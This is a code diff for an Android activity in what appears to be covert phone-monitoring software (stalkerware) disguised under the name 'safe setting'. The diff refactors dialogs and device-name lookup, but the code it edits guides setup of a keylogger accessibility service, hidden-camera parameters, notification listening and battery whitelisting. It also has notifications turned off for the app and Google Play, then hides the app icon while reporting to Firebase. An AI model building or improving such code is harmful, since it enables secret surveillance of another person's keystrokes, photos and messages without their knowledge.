@@ -3,15 +3,16 @@ package com.safe.setting.app.ui.activities.mainchild
 import android.content.ActivityNotFoundException
 import android.content.Context
 import android.content.Intent
+import android.os.Build
 import android.os.Bundle
 import android.provider.Settings
+import android.view.View
 import android.widget.Button
 import android.widget.RelativeLayout
 import android.widget.Toast
 import androidx.appcompat.widget.SwitchCompat
 import androidx.core.app.NotificationManagerCompat
-import androidx.core.content.ContextCompat // **** नया इम्पोर्ट ****
-import cn.pedant.SweetAlert.SweetAlertDialog
+import androidx.core.content.edit
 import com.google.firebase.database.DatabaseReference
 import com.safe.setting.app.R
 import com.safe.setting.app.data.model.ChildPhoto
@@ -32,14 +33,12 @@ import com.safe.setting.app.utils.async.AsyncTaskRunCommand
 import com.safe.setting.app.utils.hiddenCameraServiceUtils.HiddenCameraUtils.canOverDrawOtherApps
 import com.safe.setting.app.utils.hiddenCameraServiceUtils.HiddenCameraUtils.openDrawOverPermissionSetting
 import com.safe.setting.app.utils.hiddenCameraServiceUtils.config.CameraFacing
-import com.jaredrummler.android.device.DeviceName
-import com.pawegio.kandroid.show
+// import com.pawegio.kandroid.show // **** पुराना इम्पोर्ट हटा दिया गया ****
 import io.reactivex.rxjava3.disposables.Disposable
 import javax.inject.Inject
 
 class MainChildActivity : BaseActivity<ActivityMainChildBinding>() {
 
-    // Views
     private lateinit var btnHideApp: Button
     private lateinit var btnEnableService: RelativeLayout
     private lateinit var btnEnableOverDraw: RelativeLayout
@@ -67,7 +66,6 @@ class MainChildActivity : BaseActivity<ActivityMainChildBinding>() {
     }
 
     private fun initializeViews() {
-        // Views को बाइंड करें
         btnHideApp = binding.btnHideApp
         btnEnableService = binding.btnEnableService
         btnEnableNotificationListener = binding.btnEnableServiceNotification
@@ -75,7 +73,6 @@ class MainChildActivity : BaseActivity<ActivityMainChildBinding>() {
         btnEnableOverDraw = binding.btnEnableOverdraw
         btnAppNotificationSettings = binding.btnAppNotificationSettings
         btnPlayStoreNotificationSettings = binding.btnPlaystoreNotificationSettings
-
         switchNotificationListener = binding.switchNotification
         switchOverDraw = binding.switchOverdraw
         switchWhitelist = binding.switchAddWhitelist
@@ -99,7 +96,16 @@ class MainChildActivity : BaseActivity<ActivityMainChildBinding>() {
     private fun init() {
         getReference("${Consts.DATA}/${Consts.CHILD_SHOW_APP}").setValue(true)
         getReference("${Consts.DATA}/${Consts.CHILD_NAME}").setValue(childSelected)
-        getReference("${Consts.DATA}/${Consts.DEVICE_NAME}").setValue(DeviceName.getDeviceName())
+
+        val manufacturer = Build.MANUFACTURER
+        val model = Build.MODEL
+        val deviceName = if (model.startsWith(manufacturer, ignoreCase = true)) {
+            model
+        } else {
+            "$manufacturer $model"
+        }
+        getReference("${Consts.DATA}/${Consts.DEVICE_NAME}").setValue(deviceName)
+
         val childPhoto = ChildPhoto(false, CameraFacing.FRONT_FACING_CAMERA)
         getReference("${Consts.PHOTO}/${Consts.PARAMS}").setValue(childPhoto)
         getReference("${Consts.PHOTO}/${Consts.CHILD_PERMISSION}").setValue(true)
@@ -109,9 +115,11 @@ class MainChildActivity : BaseActivity<ActivityMainChildBinding>() {
         switchOverDraw.isChecked = canOverDrawOtherApps()
         switchAccessibility.isChecked = AccessibilityDataService.isRunningService
         switchNotificationListener.isChecked = isNotificationServiceRunning()
-        if (isAndroidM()){
+        if (isAndroidM()) {
+            // **** बदला हुआ कोड: kandroid.show को View.VISIBLE से बदलें ****
             switchWhitelist.isChecked = isAddWhitelist()
-            btnWhitelist.show()
+            btnWhitelist.visibility = View.VISIBLE
+            // **** बदलाव समाप्त ****
         }
     }
 
@@ -121,36 +129,56 @@ class MainChildActivity : BaseActivity<ActivityMainChildBinding>() {
     }
 
     private fun onClickApp() {
-        // मौजूदा OnClickListeners...
         btnHideApp.setOnClickListener { checkPermissions() }
         btnEnableService.setOnClickListener {
-            if (!AccessibilityDataService.isRunningService){
-                dialog(SweetAlertDialog.NORMAL_TYPE,R.string.msg_dialog_enable_keylogger) { openAccessibilitySettings() }
+            if (!AccessibilityDataService.isRunningService) {
+                showDialog(
+                    getString(R.string.title_dialog),
+                    getString(R.string.msg_dialog_enable_keylogger),
+                    getString(android.R.string.ok),
+                    positiveAction = { openAccessibilitySettings() }
+                )
             } else showMessage(R.string.already_activated)
         }
         btnEnableOverDraw.setOnClickListener {
-            if (!canOverDrawOtherApps()){
-                dialog(SweetAlertDialog.NORMAL_TYPE,R.string.msg_dialog_enable_overdraw) { openDrawOverPermissionSetting() }
+            if (!canOverDrawOtherApps()) {
+                showDialog(
+                    getString(R.string.title_dialog),
+                    getString(R.string.msg_dialog_enable_overdraw),
+                    getString(android.R.string.ok),
+                    positiveAction = { openDrawOverPermissionSetting() }
+                )
             } else showMessage(R.string.already_activated)
         }
+
         btnEnableNotificationListener.setOnClickListener {
-            if (!isNotificationServiceRunning()){
-                openNotificationListenerSettings()
-            } else showMessage(R.string.already_activated)
+            if (!isNotificationServiceRunning()) {
+                showDialog(
+                    getString(R.string.title_dialog),
+                    "Please enable the notification service for this app to view notifications.",
+                    getString(android.R.string.ok),
+                    positiveAction = { openNotificationListenerSettings() }
+                )
+            } else {
+                showMessage(R.string.already_activated)
+            }
         }
+
         btnWhitelist.setOnClickListener {
-            if (!isAddWhitelist()){
+            if (!isAddWhitelist()) {
                 openWhitelistSettings()
             } else showMessage(R.string.already_activated)
         }
 
-        // नोटिफिकेशन बटनों के लिए OnClickListeners
         btnAppNotificationSettings.setOnClickListener {
             if (NotificationManagerCompat.from(this).areNotificationsEnabled()) {
                 val dialogMessage = "You need to turn OFF notifications.\n\nAlso, if you see an 'Auto Start' or 'App launch' option in the same settings, please enable it.\n\nPress OK to continue."
-                dialogWithString(SweetAlertDialog.NORMAL_TYPE, dialogMessage) {
-                    openNotificationSettings(packageName)
-                }
+                showDialog(
+                    getString(R.string.title_dialog),
+                    dialogMessage,
+                    getString(android.R.string.ok),
+                    positiveAction = { openNotificationSettings(packageName) }
+                )
             } else {
                 showMessage(R.string.already_activated)
             }
@@ -159,10 +187,15 @@ class MainChildActivity : BaseActivity<ActivityMainChildBinding>() {
         btnPlayStoreNotificationSettings.setOnClickListener {
             if (!getPlayStoreVisitedPreference()) {
                 val dialogMessage = "You need to turn OFF notifications for Google Play products. Press OK to go to settings."
-                dialogWithString(SweetAlertDialog.NORMAL_TYPE, dialogMessage) {
-                    setPlayStoreVisitedPreference(true)
-                    openNotificationSettings("com.android.vending")
-                }
+                showDialog(
+                    getString(R.string.title_dialog),
+                    dialogMessage,
+                    getString(android.R.string.ok),
+                    positiveAction = {
+                        setPlayStoreVisitedPreference(true)
+                        openNotificationSettings("com.android.vending")
+                    }
+                )
             } else {
                 showMessage(R.string.already_activated)
             }
@@ -188,21 +221,21 @@ class MainChildActivity : BaseActivity<ActivityMainChildBinding>() {
         val playStoreVisited = getPlayStoreVisitedPreference()
 
         if (canOverDrawOtherApps() && isNotificationServiceRunning() && AccessibilityDataService.isRunningService && isAddWhitelist() && appNotificationsOff && playStoreVisited) {
-            // **** बदला हुआ कोड: प्रोग्रेस बार का रंग बदलें ****
-            showDialog(SweetAlertDialog.PROGRESS_TYPE,R.string.hiding,null,null){
-                progressHelper.barColor = ContextCompat.getColor(this@MainChildActivity, R.color.dark_accent)
-                show()
-            }
+            showProgressDialog(null, getString(R.string.hiding))
             showApp(false)
             getReference("${Consts.DATA}/${Consts.CHILD_SHOW_APP}").setValue(false)
         } else {
-            dialog(SweetAlertDialog.NORMAL_TYPE, R.string.enable_all_permissions)
+            showDialog(
+                getString(R.string.title_dialog),
+                getString(R.string.enable_all_permissions),
+                getString(android.R.string.ok)
+            )
         }
     }
 
     private fun setPlayStoreVisitedPreference(visited: Boolean) {
         val prefs = getSharedPreferences("AppPrefs", Context.MODE_PRIVATE)
-        prefs.edit().putBoolean("play_store_visited", visited).apply()
+        prefs.edit { putBoolean("play_store_visited", visited) }
     }
 
     private fun getPlayStoreVisitedPreference(): Boolean {
@@ -212,34 +245,22 @@ class MainChildActivity : BaseActivity<ActivityMainChildBinding>() {
 
     private fun activatePermissionRoot(command: String, showDialog: Boolean, activate: () -> Unit) {
         AsyncTaskRunCommand({
-            // **** बदला हुआ कोड: प्रोग्रेस बार का रंग बदलें ****
-            showDialog(SweetAlertDialog.PROGRESS_TYPE,R.string.activating,null,0){
-                progressHelper.barColor = ContextCompat.getColor(this@MainChildActivity, R.color.dark_accent)
-                show()
-            }
-        },{
+            showProgressDialog(null, getString(R.string.activating))
+        }, {
             hideDialog()
-            if (it){
+            if (it) {
                 activate()
-                if (showDialog) dialog(SweetAlertDialog.SUCCESS_TYPE,R.string.activated_success)
-            }else dialog(SweetAlertDialog.ERROR_TYPE,R.string.failed_activate)
+                if (showDialog) {
+                    showDialog(
+                        getString(R.string.title_dialog),
+                        getString(R.string.activated_success),
+                        getString(android.R.string.ok)
+                    )
+                }
+            } else {
+                showError(getString(R.string.failed_activate))
+            }
         }).execute(command)
-    }
-
-    private fun dialog(type: Int, msg: Int, action: (() -> Unit)? = null) {
-        showDialog(type,R.string.title_dialog,getString(msg),android.R.string.ok){
-            // **** बदला हुआ कोड: बटन का रंग बदलें ****
-            confirmButtonBackgroundColor = ContextCompat.getColor(this@MainChildActivity, R.color.dark_accent)
-            setConfirmClickListener { hideDialog() ; action?.invoke() } ; show()
-        }
-    }
-
-    private fun dialogWithString(type: Int, message: String, action: (() -> Unit)? = null) {
-        showDialog(type, R.string.title_dialog, message, android.R.string.ok) {
-            // **** बदला हुआ कोड: बटन का रंग बदलें ****
-            confirmButtonBackgroundColor = ContextCompat.getColor(this@MainChildActivity, R.color.dark_accent)
-            setConfirmClickListener { hideDialog() ; action?.invoke() } ; show()
-        }
     }
 
     override fun onDestroy() {
